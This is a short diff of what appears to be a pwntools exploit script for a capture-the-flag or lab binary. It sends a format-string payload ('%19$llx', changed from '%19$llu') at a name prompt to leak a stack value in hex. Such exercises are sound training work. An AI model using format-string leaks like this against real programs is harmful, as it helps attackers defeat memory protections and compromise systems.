@@ -8,7 +8,7 @@ r = process([exe.path])
 # gdb.attach(r)
 
 r.recvuntil(b"What's your name? ")
-r.sendline(b"%19$llu") #Add your code here
+r.sendline(b"%19$llx") #Add your code here
 
 val = r.recvuntil(b"What's your message? ")
 # log.info(val)
